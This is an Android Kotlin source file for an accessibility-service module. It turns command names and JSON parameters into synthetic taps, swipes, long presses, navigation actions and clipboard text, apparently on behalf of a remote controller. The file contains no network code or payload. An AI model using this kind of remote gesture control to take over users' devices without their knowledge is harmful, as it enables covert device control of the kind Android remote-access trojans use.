package com.storm.safe.rock.service.modules.command

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.util.Log
import org.json.JSONObject

class InputCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "InputCmd"
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "CLICK", "click",
        "SWIPE", "swipe",
        "SWIPE_PATH", "swipe_path",
        "LONG_PRESS", "long_press",
        "LONG_PRESS_DRAG",
        "back", "home", "recents",
        "input_text", "INPUT_TEXT",
        "KEY_EVENT"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        val service = context.service ?: return

        when (command.lowercase()) {
            "click" -> {
                val x = params?.optDouble("x", 0.0)?.toFloat() ?: 0f
                val y = params?.optDouble("y", 0.0)?.toFloat() ?: 0f
                dispatchTap(service, x, y)
            }
            "swipe" -> {
                val x1 = params?.optDouble("x1", 0.0)?.toFloat() ?: 0f
                val y1 = params?.optDouble("y1", 0.0)?.toFloat() ?: 0f
                val x2 = params?.optDouble("x2", 0.0)?.toFloat() ?: 0f
                val y2 = params?.optDouble("y2", 0.0)?.toFloat() ?: 0f
                val duration = params?.optLong("duration", 300L) ?: 300L
                dispatchSwipe(service, x1, y1, x2, y2, duration)
            }
            "swipe_path" -> {
                val points = params?.optJSONArray("points")
                val duration = params?.optLong("duration", 300L) ?: 300L
                if (points != null && points.length() >= 2) {
                    val path = Path()
                    val first = points.getJSONObject(0)
                    path.moveTo(first.optDouble("x").toFloat(), first.optDouble("y").toFloat())
                    for (i in 1 until points.length()) {
                        val pt = points.getJSONObject(i)
                        path.lineTo(pt.optDouble("x").toFloat(), pt.optDouble("y").toFloat())
                    }
                    dispatchPath(service, path, duration)
                }
            }
            "long_press", "long_press_drag" -> {
                val x = params?.optDouble("x", 0.0)?.toFloat() ?: 0f
                val y = params?.optDouble("y", 0.0)?.toFloat() ?: 0f
                val duration = params?.optLong("duration", 1000L) ?: 1000L
                dispatchLongPress(service, x, y, duration)
            }
            "back" -> service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
            "home" -> service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
            "recents" -> service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
            "input_text" -> {
                val text = params?.optString("text", "") ?: ""
                if (text.isNotEmpty()) {
                    try {
                        val clipboard = service.getSystemService(android.content.Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
                        clipboard?.setPrimaryClip(android.content.ClipData.newPlainText("input", text))
                    } catch (e: Exception) {
                        Log.e(TAG, "Input text failed", e)
                    }
                }
            }
            "key_event" -> {
                val keyCode = params?.optString("keyCode", "") ?: ""
                Log.d(TAG, "KEY_EVENT: $keyCode")
            }
        }
    }

    private fun dispatchTap(service: AccessibilityService, x: Float, y: Float) {
        if (Build.VERSION.SDK_INT < 24) return
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    private fun dispatchSwipe(service: AccessibilityService, x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
        if (Build.VERSION.SDK_INT < 24) return
        val path = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(50)))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    private fun dispatchPath(service: AccessibilityService, path: Path, duration: Long) {
        if (Build.VERSION.SDK_INT < 24) return
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(50)))
            .build()
        service.dispatchGesture(gesture, null, null)
    }

    private fun dispatchLongPress(service: AccessibilityService, x: Float, y: Float, duration: Long) {
        if (Build.VERSION.SDK_INT < 24) return
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(500)))
            .build()
        service.dispatchGesture(gesture, null, null)
    }
}
